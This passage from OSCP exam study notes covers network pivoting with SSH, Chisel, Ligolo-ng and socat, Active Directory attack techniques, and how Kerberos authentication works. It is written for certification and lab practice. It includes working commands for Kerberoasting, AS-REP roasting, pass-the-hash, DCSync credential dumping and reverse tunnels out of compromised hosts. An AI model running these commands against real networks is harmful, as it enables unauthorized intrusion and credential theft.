ssh -R <remote_port>:<target>:<target_port> user@ssh_server
```

Example:

```bash
ssh -R 8080:127.0.0.1:80 user@10.10.10.10
```

Traffic flow:

```text
Remote SSH Server:8080
          |
          | SSH tunnel
          v
Attacker:80
```

This is useful when the remote/pivot machine can connect to the attacker but the attacker cannot directly connect to the remote network.

### Common OSCP Scenario

```text
Internal Host
     |
     | SSH connection
     v
Attacker
```

The internal host can establish an outbound connection, allowing the attacker to expose a service through the SSH connection.

---

## 6. SSH Dynamic Port Forwarding

Dynamic forwarding creates a **SOCKS proxy**.

Syntax:

```bash
ssh -D 9050 user@10.10.10.10
```

This creates:

```text
127.0.0.1:9050
```

Applications configured to use the SOCKS proxy can send traffic through the SSH server.

Example with proxychains:

```bash
proxychains nmap -sT -Pn 10.10.10.20
```

Or:

```bash
proxychains curl http://10.10.10.20
```

### Important

With SOCKS:

```text
Attacker
   |
   v
SOCKS Proxy
   |
   v
Pivot
   |
   v
Internal Network
```

You don't need to create a separate local port for every internal service.

---

## 7. ProxyChains

ProxyChains forces supported applications to use a proxy.

Configuration:

```bash
sudo nano /etc/proxychains4.conf
```

Example:

```text
socks5 127.0.0.1 9050
```

Run:

```bash
proxychains <command>
```

Example:

```bash
proxychains curl http://10.10.10.20
```

Or:

```bash
proxychains nmap -sT -Pn 10.10.10.20
```

### Nmap Important

Avoid:

```bash
proxychains nmap -sS
```

Prefer:

```bash
proxychains nmap -sT -Pn
```

Why?

`-sS` requires raw packet access and generally does not work correctly through SOCKS/ProxyChains.

`-sT` uses a normal TCP connection.

---

## 8. Chisel

**Chisel** is a fast TCP/UDP tunneling tool commonly used for pivoting.

Basic architecture:

```text
Attacker
   |
   | Chisel
   v
Compromised Host
   |
   v
Internal Network
```

---

## 9. Chisel Server

On the attacker:

```bash
chisel server --reverse -p 8000
```

Example:

```text
Attacker
10.10.14.5
   |
   | TCP 8000
   v
Compromised Host
```

---

## 10. Chisel Reverse SOCKS

On the attacker:

```bash
chisel server --reverse -p 8000
```

On the compromised machine:

```bash
chisel client 10.10.14.5:8000 R:socks
```

This creates a reverse SOCKS tunnel.

Conceptually:

```text
Attacker
  |
  | SOCKS
  v
Compromised Host
  |
  v
Internal Network
```

Configure ProxyChains:

```text
socks5 127.0.0.1 1080
```

Then:

```bash
proxychains nmap -sT -Pn 10.10.10.20
```

---

## 11. Chisel Local Port Forward

Example:

```bash
chisel server -p 8000
```

On the compromised host:

```bash
chisel client 10.10.14.5:8000 8080:10.10.10.20:80
```

Now:

```text
Attacker:8080
      |
      v
Compromised Host
      |
      v
10.10.10.20:80
```

Access:

```bash
curl http://127.0.0.1:8080
```

---

## 12. Ligolo-ng

**Ligolo-ng** creates a VPN-like tunnel and is extremely useful for network pivoting.

Basic architecture:

```text
Attacker
   |
   | Ligolo tunnel
   v
Compromised Host
   |
   v
Internal Network
```

Unlike ProxyChains, applications can often communicate with internal hosts normally through a virtual network interface.

### Typical Setup

Attacker:

```bash
sudo ip tuntap add user $USER mode tun ligolo
sudo ip link set ligolo up
```

Start proxy:

```bash
./proxy -selfcert
```

On compromised machine:

```bash
./agent -connect 10.10.14.5:11601 -ignore-cert
```

After the agent connects, select the session in the Ligolo console and start the tunnel.

Then add a route to the internal network:

```bash
sudo ip route add 10.10.10.0/24 dev ligolo
```

Now traffic can be routed through the tunnel.

---

## 13. SSHuttle

`sshuttle` provides a lightweight VPN-like tunnel over SSH.

Example:

```bash
sshuttle -r user@10.10.10.10 10.10.10.0/24
```

This allows traffic destined for:

```text
10.10.10.0/24
```

to travel through the SSH host.

Useful when:

- SSH access exists.
    
- You need access to multiple internal hosts.
    
- Setting up a full SOCKS proxy is unnecessary.
    

---

## 14. Socat Port Forwarding

`socat` can forward TCP connections.

Example:

```bash
socat TCP-LISTEN:8080,fork TCP:10.10.10.20:80
```

This means:

```text
localhost:8080
      |
      v
10.10.10.20:80
```

Another common example:

```bash
socat TCP-LISTEN:4444,fork TCP:10.10.14.5:4444
```

Useful for simple port relaying.

---

## 15. RDP Through a Tunnel

Suppose:

```text
Internal Windows Host
10.10.10.20:3389
```

Create SSH forwarding:

```bash
ssh -L 3389:10.10.10.20:3389 user@10.10.10.10
```

Then connect:

```bash
xfreerdp /v:127.0.0.1:3389 /u:user /p:'Password'
```

Traffic:

```text
xfreerdp
   |
   v
127.0.0.1:3389
   |
 SSH tunnel
   |
   v
10.10.10.10
   |
   v
10.10.10.20:3389
```

---

## 16. Internal Web Application Through Tunnel

Example:

```text
Compromised Host
10.10.10.10

Internal Web Server
10.10.10.20:8080
```

Create:

```bash
ssh -L 8080:10.10.10.20:8080 user@10.10.10.10
```

Browse:

```text
http://127.0.0.1:8080
```

Useful for:

- Internal admin panels
    
- Internal APIs
    
- Jenkins
    
- Grafana
    
- Elasticsearch
    
- Development servers
    

---

## 17. Pivoting Scenario

Typical OSCP network:

```text
                INTERNET
                    |
                    |
              ATTACKER
             10.10.14.5
                    |
                    |
             10.10.10.10
             Compromised
              Pivot Host
                    |
          ---------------------
          |                   |
    10.10.10.20         10.10.10.30
    Web Server            Windows
```

The attacker cannot directly reach:

```text
10.10.10.20
10.10.10.30
```

But the compromised host can.

Therefore:

```text
Attacker
   |
   | Tunnel
   v
Pivot
   |
   +----> Internal Host 1
   |
   +----> Internal Host 2
```

---

## 18. Choosing the Right Technique

|Situation|Technique|
|---|---|
|One internal TCP service|SSH `-L`|
|Remote machine needs access to attacker-side service|SSH `-R`|
|Multiple internal TCP services|SSH `-D` / SOCKS|
|Proxying tools through a pivot|ProxyChains|
|Easy reverse SOCKS tunnel|Chisel|
|VPN-like pivoting|Ligolo-ng|
|SSH-based network tunneling|sshuttle|
|Simple TCP relay|Socat|

---

## 19. Common Mistakes

### Mistake 1 — Wrong direction

Always identify:

```text
Who can reach whom?
```

Before creating the tunnel.

---

### Mistake 2 — Forgetting the pivot's network access

A tunnel does not magically provide access.

The pivot must be able to reach the destination:

```bash
nc -zv 10.10.10.20 80
```

---

### Mistake 3 — Using Nmap incorrectly through SOCKS

Use:

```bash
proxychains nmap -sT -Pn <target>
```

rather than SYN scanning.

---

### Mistake 4 — Confusing bind address and destination

For:

```bash
ssh -L 8080:10.10.10.20:80 user@10.10.10.10
```

The important pieces are:

```text
8080              = local listening port
10.10.10.20       = destination
80                = destination port
10.10.10.10       = SSH/pivot host
```

---

## 20. OSCP Mental Model

Before tunneling, answer these four questions:

```text
1. Where am I?
2. What networks can I reach?
3. What can the pivot reach?
4. What service do I need to access?
```

Then choose:

```text
One service
    ↓
SSH -L

Multiple services
    ↓
SOCKS / Chisel

Whole internal subnet
    ↓
Ligolo-ng / sshuttle
```

---

## 21. Quick Command Cheat Sheet

### SSH Local Forward

```bash
ssh -L 8080:10.10.10.20:80 user@10.10.10.10
```

### SSH Remote Forward

```bash
ssh -R 8080:127.0.0.1:80 user@10.10.10.10
```

### SSH SOCKS

```bash
ssh -D 9050 user@10.10.10.10
```

### ProxyChains

```bash
proxychains nmap -sT -Pn 10.10.10.20
```

### Chisel Server

```bash
chisel server --reverse -p 8000
```

### Chisel Reverse SOCKS

```bash
chisel client 10.10.14.5:8000 R:socks
```

### Socat

```bash
socat TCP-LISTEN:8080,fork TCP:10.10.10.20:80
```

### SSHuttle

```bash
sshuttle -r user@10.10.10.10 10.10.10.0/24
```

### Ligolo Route

```bash
sudo ip route add 10.10.10.0/24 dev ligolo
```

---

## 22. Key Takeaways

```text
Port Forwarding
    = Forward a specific port

SOCKS Proxy
    = Dynamically proxy connections

Tunneling
    = Carry traffic through another connection

Pivoting
```
# ==Active Directory Attacks== 
![[active-directory-security.png]]

> **OSCP/PEN-200 focus:** Enumeration → Authentication Attacks → Credential Access → Lateral Movement → Domain Compromise.

Active Directory is a major part of the current OSCP+ exam. OffSec currently allocates **26%** of the exam objectives to Active Directory, covering domain/account enumeration, lateral movement, common AD vulnerabilities, and achieving high-privileged domain access.

---

## 1. Active Directory Attack Methodology

A typical AD attack path:

```text
Initial Access
      ↓
Domain Enumeration
      ↓
User / Computer / Group Enumeration
      ↓
Identify Credentials or Attack Path
      ↓
Authentication Attack
      ↓
Credential Access
      ↓
Lateral Movement
      ↓
Privilege Escalation
      ↓
Domain Admin / High-Privileged Access
```

The important concept is:

> **Do not attack randomly. Enumerate first, identify relationships, then follow the shortest viable attack path.**

OffSec specifically emphasizes that AD enumeration feeds the attacks performed later in the module.

---

## 2. Active Directory Components

Important terminology:

### Domain

A logical security boundary containing users, computers, groups, and policies.

Example:

```text
corp.local
```

### Domain Controller — DC

A Windows server running AD DS and providing services such as:

- Authentication
    
- Kerberos
    
- LDAP
    
- DNS
    
- Domain management
    

Example:

```text
DC01.corp.local
```

### Domain User

Example:

```text
corp\john
```

### Domain Admin

A highly privileged account/group capable of administering the domain.

### Organizational Unit — OU

Container used to organize AD objects.

### Security Group

Used to assign permissions to users/computers.

---

## 3. Important AD Ports

During initial enumeration, look for:

|Port|Service|
|--:|---|
|53|DNS|
|88|Kerberos|
|135|MSRPC|
|139|NetBIOS|
|389|LDAP|
|445|SMB|
|464|Kerberos Password|
|636|LDAPS|
|3268|Global Catalog|
|3269|Global Catalog over SSL|
|5985|WinRM HTTP|
|5986|WinRM HTTPS|

Basic scan:

```bash
nmap -p- -sC -sV <IP>
```

For a suspected DC:

```bash
nmap -p 53,88,135,139,389,445,464,636,3268,3269,5985,5986 -sC -sV <IP>
```

---

## 4. Identifying a Domain Controller

Look for:

```text
53 DNS
88 Kerberos
389 LDAP
445 SMB
3268 Global Catalog
```

Nmap:

```bash
nmap -p 53,88,389,445 --script "ldap* or smb*" <IP>
```

SMB:

```bash
smbclient -L //<IP> -N
```

RPC:

```bash
rpcclient -U "" -N <IP>
```

---

## 5. DNS Enumeration

DNS can reveal:

- Domain name
    
- Hostnames
    
- Domain controllers
    
- Internal servers
    
- Infrastructure
    

Reverse lookup:

```bash
nslookup <IP>
```

Query DNS:

```bash
nslookup
server <DC-IP>
```

Then:

```text
set type=ANY
corp.local
```

Linux:

```bash
dig @<DC-IP> corp.local
```

Look for:

```text
SOA
NS
A
SRV
```

Especially useful:

```text
_kerberos._tcp
_ldap._tcp
```

---

## 6. SMB Enumeration

Anonymous SMB:

```bash
smbclient -L //<IP> -N
```

With credentials:

```bash
smbclient -L //<IP> -U 'corp\username'
```

Connect:

```bash
smbclient //<IP>/Share -U 'corp\username'
```

Enumerate recursively:

```bash
smbmap -H <IP>
```

Authenticated:

```bash
smbmap -H <IP> -u username -p password -d corp.local
```

Look for:

```text
SYSVOL
NETLOGON
Users
IT
HR
Backup
Scripts
```

---

## 7. LDAP Enumeration

LDAP commonly runs on:

```text
389
```

LDAPS:

```text
636
```

Basic query:

```bash
ldapsearch -x -H ldap://<DC-IP> -s base
```

Authenticated:

```bash
ldapsearch -x \
-H ldap://<DC-IP> \
-D 'user@corp.local' \
-W \
-b 'DC=corp,DC=local'
```

Useful information:

```text
Users
Groups
Computers
SPNs
Descriptions
Group memberships
Object permissions
```

---

## 8. Legacy Windows Enumeration

Once you obtain Windows access, start with:

```cmd
whoami
whoami /all
whoami /groups
whoami /priv
```

Domain:

```cmd
echo %USERDOMAIN%
echo %USERDNSDOMAIN%
```

Computer:

```cmd
hostname
systeminfo
```

Network:

```cmd
ipconfig /all
route print
arp -a
```

Domain information:

```cmd
net user /domain
net group /domain
net group "Domain Admins" /domain
```

Logged-on users:

```cmd
query user
```

---

## 9. PowerShell AD Enumeration

Current user:

```powershell
whoami
```

Domain:

```powershell
[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
```

Computer information:

```powershell
Get-ComputerInfo
```

Domain users:

```powershell
Get-ADUser -Filter *
```

Domain groups:

```powershell
Get-ADGroup -Filter *
```

Group members:

```powershell
Get-ADGroupMember "Domain Admins"
```

Computers:

```powershell
Get-ADComputer -Filter *
```

> The AD PowerShell module may not be installed on every compromised machine.

---

## 10. PowerView

PowerView is commonly used for AD enumeration.

Import:

```powershell
Import-Module .\PowerView.ps1
```

Domain:

```powershell
Get-NetDomain
```

Users:

```powershell
Get-NetUser
```

Computers:

```powershell
Get-NetComputer
```

Groups:

```powershell
Get-NetGroup
```

Domain Admins:

```powershell
Get-NetGroupMember "Domain Admins"
```

Logged-on users:

```powershell
Get-NetLoggedon -ComputerName <computer>
```

Shares:

```powershell
Find-DomainShare
```

SPNs:

```powershell
Get-NetUser -SPN
```

---

## 11. BloodHound

BloodHound maps relationships inside Active Directory.

It can reveal paths such as:

```text
User
 ↓
Group
 ↓
Computer
 ↓
Local Admin
 ↓
Domain Admin
```

Collect data using SharpHound:

```powershell
.\SharpHound.exe -c All
```

Then import the resulting ZIP into BloodHound.

Useful relationship types include:

```text
MemberOf
AdminTo
CanRDP
CanPSRemote
ExecuteDCOM
GenericAll
GenericWrite
WriteDACL
WriteOwner
ForceChangePassword
AddMember
```

The current OSCP Body of Knowledge explicitly includes collecting domain data with SharpHound and analyzing it with BloodHound.

---

## 12. Account Enumeration

Find users:

```cmd
net user /domain
```

Find groups:

```cmd
net group /domain
```

Domain Admins:

```cmd
net group "Domain Admins" /domain
```

Look for:

```text
Service accounts
Admin accounts
Disabled accounts
Old accounts
Privileged groups
Password descriptions
```

Descriptions can sometimes contain sensitive information:

```text
Password: Summer2025!
Temporary password...
Backup account...
```

Never assume a discovered password is valid without testing it appropriately.

---

## 13. Password Attacks

Potential sources of credentials:

```text
SMB shares
SYSVOL
NETLOGON
Scripts
Configuration files
PowerShell history
Web configuration
Backups
User profiles
Password reuse
```

Password spraying concept:

```text
One password
    ↓
Many users
```

This is different from brute forcing:

```text
One user
    ↓
Many passwords
```

Be careful with lockout policies.

---

## 14. AS-REP Roasting

AS-REP roasting targets accounts where:

```text
Do not require Kerberos preauthentication
```

The attacker can request an AS-REP response without knowing the user's password.

Conceptually:

```text
User with preauth disabled
        ↓
AS-REQ
        ↓
Domain Controller
        ↓
AS-REP
        ↓
Offline password cracking
```

Find vulnerable users:

```bash
impacket-GetNPUsers corp.local/ -dc-ip <DC-IP> -usersfile users.txt -no-pass
```

If a hash is obtained:

```bash
hashcat -m 18200 hash.txt wordlist.txt
```

The important idea:

> **AS-REP Roasting attacks Kerberos preauthentication configuration, not a vulnerable service.**

---

## 15. Kerberoasting

Kerberoasting targets accounts associated with **Service Principal Names — SPNs**.

Find SPNs:

```powershell
Get-NetUser -SPN
```

Impacket:

```bash
impacket-GetUserSPNs corp.local/user:password -dc-ip <DC-IP>
```

The attacker obtains a service ticket and attempts to crack the service account password offline.

Concept:

```text
SPN
 ↓
Request TGS
 ↓
Extract ticket material
 ↓
Offline cracking
 ↓
Service account credentials
```

The current PEN-200 objectives explicitly include abusing the Kerberos SPN authentication mechanism.

---

## 16. NTLM Authentication

NTLM is a challenge-response authentication protocol.

Simplified:

```text
Client
  |
  | Authentication request
  v
Server
  |
  | Challenge
  v
Client
  |
  | Response based on password hash
  v
Server
```

Important consequence:

> In some attack scenarios, possession of an NTLM password hash can be enough to authenticate without knowing the plaintext password.

This leads to:

```text
Pass the Hash
```

---

## 17. Kerberos Authentication

Kerberos uses tickets.

Simplified:

```text
Client
  |
  v
KDC
  |
  +--> Authentication Service
  |
  +--> Ticket Granting Service
  |
  v
Service Ticket
  |
  v
Target Service
```

Important terminology:

```text
TGT = Ticket Granting Ticket
TGS = Ticket Granting Service / Service Ticket
SPN = Service Principal Name
```

Understanding the difference between NTLM and Kerberos is essential for AD attacks.

---

## 18. Cached Credentials

Windows may cache authentication-related information locally.

During post-exploitation, inspect the system for:

```text
Credential material
Cached domain credentials
LSA secrets
SAM database
Kerberos tickets
```

Tools and techniques depend on your privileges and the specific credential store.

---

## 19. Credential Discovery

Search for credentials in:

```text
PowerShell history
Configuration files
Scripts
Web applications
Scheduled tasks
Services
Registry
SMB shares
Backups
User directories
```

PowerShell history:

```powershell
Get-Content (Get-PSReadLineOption).HistorySavePath
```

Search files:

```powershell
Get-ChildItem C:\ -Recurse -ErrorAction SilentlyContinue |
Select-String -Pattern "password|passwd|pwd"
```

Be selective on large systems.

---

## 20. Lateral Movement

Once credentials are obtained, determine where they work.

Common Windows remote execution mechanisms:

```text
WMI
WinRM
PsExec
SMB
DCOM
RDP
```

OffSec's current PEN-200 material specifically covers WMI/WinRM, PsExec, Pass the Hash, Overpass the Hash, Pass the Ticket, and DCOM.

---

## 21. WinRM

WinRM commonly uses:

```text
5985 HTTP
5986 HTTPS
```

Check:

```bash
nmap -p 5985,5986 <IP>
```

PowerShell:

```powershell
Test-WSMan <IP>
```

Remote session:

```powershell
Enter-PSSession -ComputerName <IP> -Credential <credential>
```

With valid authorized credentials, WinRM can provide remote command execution.

---

## 22. WMI

WMI can be used for remote execution when appropriate permissions exist.

Example:

```cmd
wmic /node:<IP> /user:<domain\user> process call create "cmd.exe"
```

PowerShell alternative:

```powershell
Invoke-WmiMethod -ComputerName <IP> -Class Win32_Process -Name Create -ArgumentList "cmd.exe"
```

---

## 23. PsExec

PsExec-style execution uses SMB and Windows service functionality.

Impacket:

```bash
impacket-psexec corp.local/user:password@<IP>
```

Hash-based authentication:

```bash
impacket-psexec -hashes :<NTLM_HASH> corp.local/user@<IP>
```

The latter is an example of:

```text
Pass the Hash
```

---

## 24. Pass the Hash

If you have:

```text
Username
+
NTLM hash
```

you may be able to authenticate without knowing the plaintext password.

Example:

```bash
impacket-wmiexec -hashes :<NTLM_HASH> corp.local/user@<IP>
```

Concept:

```text
NTLM Hash
    ↓
Authentication
    ↓
Remote Access
```

---

## 25. Overpass the Hash

Overpass the Hash converts an NTLM hash into a Kerberos authentication context.

Conceptually:

```text
NTLM Hash
   ↓
Obtain Kerberos TGT
   ↓
Use Kerberos authentication
```

This differs from Pass the Hash:

```text
Pass the Hash
→ Use NTLM hash directly

Overpass the Hash
→ Use NTLM hash to obtain Kerberos credentials
```

---

## 26. Pass the Ticket

If you obtain a valid Kerberos ticket, it may be possible to use that ticket to authenticate to services.

Concept:

```text
Kerberos Ticket
      ↓
Inject / Use Ticket
      ↓
Authenticate
      ↓
Access Service
```

The current PEN-200 curriculum explicitly includes Pass the Ticket.

---

## 27. DCOM Lateral Movement

DCOM can provide remote code execution when the required permissions and configuration are present.

Concept:

```text
Attacker
   ↓
DCOM
   ↓
Remote Windows Host
   ↓
Command Execution
```

PowerShell tooling can interact with DCOM objects.

---

## 28. Silver Ticket

A Silver Ticket is a forged Kerberos **service ticket**.

Concept:

```text
Service Account Hash
       +
     SPN
       ↓
Forged Service Ticket
       ↓
Target Service
```

It targets a specific service rather than the entire domain.

Example target:

```text
CIFS/server.corp.local
```

Important:

```text
Silver Ticket
→ Service-specific

Golden Ticket
→ Domain-wide TGT
```

---

## 29. DCSync

DCSync abuses replication permissions to request password data from a Domain Controller as if the attacker were another domain controller.

Concept:

```text
Attacker
   ↓
Replication Request
   ↓
Domain Controller
   ↓
Credential Material
```

Impacket:

```bash
impacket-secretsdump -just-dc-user <username> \
corp.local/user:password@<DC-IP>
```

For the domain Administrator:

```bash
impacket-secretsdump -just-dc-user Administrator \
corp.local/user:password@<DC-IP>
```

DCSync requires appropriate replication privileges; merely being a normal domain user is not sufficient.

---

## 30. Golden Ticket

A Golden Ticket is a forged Kerberos TGT.

It is based on the secret associated with the domain's:

```text
krbtgt
```

Concept:

```text
krbtgt secret
     ↓
Forge TGT
     ↓
Authenticate as chosen identity
     ↓
Access domain resources
```

This is a persistence/domain-compromise technique rather than a typical initial-access technique.

OffSec explicitly includes Golden Tickets under AD persistence.

---

## 31. Shadow Copies

Windows Volume Shadow Copies can contain previous versions of files and potentially sensitive credential databases.

Concept:

```text
Current System
      +
Shadow Copy
      ↓
Previous system state
      ↓
Potential credential recovery
```

The current PEN-200 objectives include abusing shadow copies as an AD persistence technique.

---

## 32. AD Attack Chain Example

A common learning scenario:

```text
Initial Foothold
      ↓
Enumerate Domain
      ↓
Find Users
      ↓
Find SPNs
      ↓
Kerberoast
      ↓
Crack Service Account
      ↓
Authenticate
      ↓
BloodHound
      ↓
Find Admin Relationship
      ↓
Lateral Movement
      ↓
Compromise Privileged Account
      ↓
Domain Controller
```

Another:

```text
Initial Access
      ↓
Enumerate AD
      ↓
AS-REP Roasting
      ↓
Recover Password
      ↓
BloodHound
      ↓
Identify Local Admin Access
      ↓
Pass the Hash
      ↓
Move to Another Machine
      ↓
Obtain Higher Privileges
```

These are **examples of possible chains**, not a fixed OSCP sequence.

---

## 33. BloodHound Attack-Path Mindset

After collecting BloodHound data, ask:

```text
Who am I?
      ↓
What groups am I in?
      ↓
What machines can I access?
      ↓
Where am I local admin?
      ↓
Which users are logged in?
      ↓
Which privileged groups exist?
      ↓
What ACL relationships exist?
      ↓
What is the shortest path to high privilege?
```

Important relationships:

```text
MemberOf
AdminTo
CanRDP
CanPSRemote
ExecuteDCOM
GenericAll
GenericWrite
WriteDACL
WriteOwner
AddMember
ForceChangePassword
```

---

## 34. High-Value Enumeration Checklist

After obtaining a domain account:

```text
[ ] whoami /all
[ ] Domain name
[ ] Domain Controller
[ ] Domain users
[ ] Domain groups
[ ] Domain Admins
[ ] Computers
[ ] Logged-on users
[ ] SMB shares
[ ] SYSVOL
[ ] NETLOGON
[ ] SPNs
[ ] Service accounts
[ ] Password policies
[ ] Interesting descriptions
[ ] Object permissions
[ ] Local administrator relationships
[ ] WinRM access
[ ] RDP access
[ ] BloodHound collection
```

---

## 35. OSCP AD Attack Decision Tree

```text
Got Domain Credentials?
        |
        +-- NO
        |    |
        |    +--> Enumerate users
        |    +--> SMB shares
        |    +--> SYSVOL / NETLOGON
        |    +--> AS-REP Roasting
        |    +--> Kerberoasting
        |    +--> Password attacks
        |
        +-- YES
             |
             +--> Enumerate domain
             |
             +--> BloodHound
             |
             +--> Check privileges
             |
             +--> Identify lateral movement
             |
             +--> WMI / WinRM / SMB / RDP / DCOM
             |
             +--> Obtain higher privileges
             |
             +--> Re-enumerate
```

---

## 36. Re-Enumeration Rule

One of the most important OSCP habits:

```text
New Access
    ↓
New Credentials
    ↓
NEW Enumeration
    ↓
NEW Attack Path
```

Do **not** stop enumeration after obtaining your first shell.

Every new account can reveal:

- New shares
    
- New permissions
    
- New hosts
    
- New groups
    
- New credentials
    
- New BloodHound relationships
    

OffSec explicitly describes enumeration as a cyclical process that expands as new access and information are obtained.

---

## 37. OSCP AD Quick Cheat Sheet

### Domain

```cmd
whoami
whoami /all
echo %USERDOMAIN%
echo %USERDNSDOMAIN%
```

### Users

```cmd
net user /domain
```

### Groups

```cmd
net group /domain
```

### Domain Admins

```cmd
net group "Domain Admins" /domain
```

### SMB

```bash
smbclient -L //<IP> -N
```

### LDAP

```bash
ldapsearch -x -H ldap://<DC-IP> -s base
```

### Kerberoasting

```bash
impacket-GetUserSPNs corp.local/user:password -dc-ip <DC-IP>
```

### AS-REP Roasting

```bash
impacket-GetNPUsers corp.local/ -dc-ip <DC-IP> -usersfile users.txt -no-pass
```

### BloodHound

```powershell
.\SharpHound.exe -c All
```

### PsExec

```bash
impacket-psexec corp.local/user:password@<IP>
```

### Pass the Hash

```bash
impacket-psexec -hashes :<NTLM_HASH> corp.local/user@<IP>
```

### WMI

```bash
impacket-wmiexec corp.local/user:password@<IP>
```

### DCSync

```bash
impacket-secretsdump -just-dc-user Administrator corp.local/user:password@<DC-IP>
```

---

## 38. What to Master for OSCP

### Tier 1 — Must Know

```text
AD enumeration
SMB enumeration
LDAP
PowerView
SharpHound
BloodHound
NTLM
Kerberos
AS-REP Roasting
Kerberoasting
Password attacks
```

### Tier 2 — Must Practice

```text
WinRM
WMI
PsExec
Pass the Hash
Overpass the Hash
Pass the Ticket
DCOM
DCSync
```

### Tier 3 — Understand Well

```text
Silver Tickets
Golden Tickets
Shadow Copies
AD persistence
```

This aligns closely with OffSec's current PEN-200/OSCP+ objectives and module structure.

---

## 39. Final OSCP Mental Model

```text
             ACTIVE DIRECTORY
                    │
        ┌───────────┴───────────┐
        │                       │
   ENUMERATION             AUTHENTICATION
        │                       │
   ┌────┼────┐             ┌────┼────┐
   │    │    │             │    │    │
 Users Hosts Groups       NTLM Kerberos
   │    │    │                  │
   └────┴────┘          ┌───────┴────────┐
        │               │                │
        │          AS-REP Roast     Kerberoast
        │               │                │
        └───────────────┴────────────────┘
                        │
                  CREDENTIALS
                        │
                        ↓
                LATERAL MOVEMENT
                        │
             ┌──────────┼──────────┐
             │          │          │
            SMB       WinRM       WMI
             │          │          │
             └──────────┼──────────┘
                        ↓
                  PRIVILEGE ESC.
                        │
                        ↓
                  DOMAIN ACCESS
```

**Core rule:**  
**Enumerate → Identify credentials/relationships → Authenticate → Move → Re-enumerate → Escalate → Repeat.**

For the current OSCP+ exam, the AD set consists of **two clients and one Domain Controller**, worth **40 points total** (10 + 10 + 20). OffSec also states that pivoting may be required and that course material is subject to appearing on the exam.
# ==Active Directory - Kerberos Authentication==
![[active-directory-security 1.png]]
## 1. What Is Kerberos?

**Kerberos** is the primary authentication protocol used by Active Directory.

It allows users and services to authenticate securely without sending the user's plaintext password over the network.

Kerberos uses **tickets** instead of repeatedly sending passwords.

```text
User
  ↓
Kerberos Authentication
  ↓
Ticket
  ↓
Access Service
```

Default Kerberos port:

```text
UDP/TCP 88
```

---

## 2. Important Kerberos Components

### Client

The machine/user requesting authentication.

### KDC — Key Distribution Center

Usually runs on the **Domain Controller**.

The KDC contains two logical services:

```text
Authentication Service (AS)
Ticket Granting Service (TGS)
```

### Service

The resource the user wants to access.

Examples:

```text
SMB
HTTP
LDAP
MSSQL
```

---

## 3. Important Terms

|Term|Meaning|
|---|---|
|KDC|Key Distribution Center|
|AS|Authentication Service|
|TGS|Ticket Granting Service|
|TGT|Ticket Granting Ticket|
|SPN|Service Principal Name|
|KRB-REQ|Kerberos request|
|KRB-REP|Kerberos response|
|Session Key|Temporary key used for a session|
|`krbtgt`|Special AD account used by the KDC|

---

## 4. Basic Kerberos Flow

The simplified authentication process is:

```text
        DOMAIN CONTROLLER
              │
              │
        ┌─────┴─────┐
        │    KDC    │
        └─────┬─────┘
              │
       ┌──────┴──────┐
       │             │
      AS            TGS
       │             │
       └──────┬──────┘
              │
            User
              │
              ↓
           Service
```

The process has three major stages:

```text
1. AS-REQ / AS-REP
2. TGS-REQ / TGS-REP
3. AP-REQ / AP-REP
```

---

## 5. Step 1 — AS-REQ

The client wants to authenticate to the domain.

It sends an:

```text
AS-REQ
```

to the Domain Controller's Kerberos service.

Conceptually:

```text
Client
   |
   | AS-REQ
   ↓
KDC
```

The request identifies the user and asks for a **TGT**.

---

## 6. Step 2 — AS-REP

If authentication succeeds, the KDC responds with:

```text
AS-REP
```

The response contains a:

```text
TGT
```

and information needed to continue authentication.

Conceptually:

```text
Client
   ↑
   | AS-REP + TGT
   |
KDC
```

The TGT can then be used to request service tickets.

---

## 7. TGT — Ticket Granting Ticket

The **TGT** proves to the KDC that the user has already authenticated.

Instead of sending the password every time:

```text
Password
   ↓
Authentication
   ↓
TGT
   ↓
Request service tickets
```

The TGT is normally encrypted using a secret associated with the:

```text
krbtgt
```

account.

---

## 8. Step 3 — TGS-REQ

The user wants to access a particular service.

For example:

```text
SMB on SERVER01
```

The client sends:

```text
TGS-REQ
```

to the KDC.

Conceptually:

```text
Client
   |
   | TGS-REQ + TGT
   ↓
KDC
```

The request specifies the desired service, normally identified through an **SPN**.

---

## 9. SPN — Service Principal Name

An **SPN** uniquely identifies a service instance in an Active Directory environment.

Common format:

```text
SERVICE/HOSTNAME
```

Examples:

```text
HTTP/web01.corp.local
MSSQLSvc/sql01.corp.local:1433
cifs/server01.corp.local
```

SPNs are important because Kerberos uses them to determine which account is associated with a service.

---

## 10. Step 4 — TGS-REP

The KDC responds with:

```text
TGS-REP
```

containing a **service ticket**.

Conceptually:

```text
Client
   ↑
   | TGS-REP
   |
KDC
```

The client can then use that ticket to authenticate to the requested service.

---

## 11. Step 5 — AP-REQ

The client presents the service ticket to the target service.

```text
Client
   |
   | AP-REQ + Service Ticket
   ↓
Service
```

If the ticket is valid, the service grants access according to the user's permissions.

---

## 12. Complete Kerberos Flow

Memorize this:

```text
                 DOMAIN CONTROLLER
                        │
                        │
                    ┌───┴───┐
                    │  KDC  │
                    └───┬───┘
                        │
       ┌────────────────┼────────────────┐
       │                │                │
       │ 1. AS-REQ      │                │
       ├───────────────>│                │
       │                │                │
       │ 2. AS-REP      │                │
       │<───────────────┤                │
       │                │                │
       │ 3. TGS-REQ     │                │
       ├───────────────>│                │
       │                │                │
       │ 4. TGS-REP     │                │
       │<───────────────┤                │
       │                                 │
       │ 5. AP-REQ                      │
       ├────────────────────────────────>│
       │                                 │
       │          SERVICE ACCESS         │
```

Shortcut:

```text
AS-REQ
AS-REP
   ↓
TGT
   ↓
TGS-REQ
TGS-REP
   ↓
Service Ticket
   ↓
AP-REQ
   ↓
Service
```

---

## 13. Why Kerberos Is Important for OSCP

Understanding Kerberos explains several major AD attacks:

```text
AS-REP Roasting
Kerberoasting
Pass the Ticket
Overpass the Hash
Silver Tickets
Golden Tickets
```

You should understand **which Kerberos object each attack targets**.

---

## 14. AS-REP Roasting

Normally, Kerberos uses **preauthentication** to verify that the user knows their secret before the KDC returns an AS-REP.

If an account has:

```text
Do not require Kerberos preauthentication
```

enabled, an attacker may request an AS-REP without knowing the user's password.

Conceptually:

```text
Vulnerable User
      ↓
AS-REQ
      ↓
KDC
      ↓
AS-REP
      ↓
Offline Cracking
```

The important point:

> **AS-REP Roasting targets accounts with Kerberos preauthentication disabled.**

---

## 15. Kerberoasting

Kerberoasting targets service accounts with registered SPNs.

Flow:

```text
Valid Domain User
      ↓
Request TGS
      ↓
KDC
      ↓
Service Ticket
      ↓
Offline Password Cracking
```

The attack works because the service ticket contains encrypted material associated with the service account's secret.

Find SPNs:

```powershell
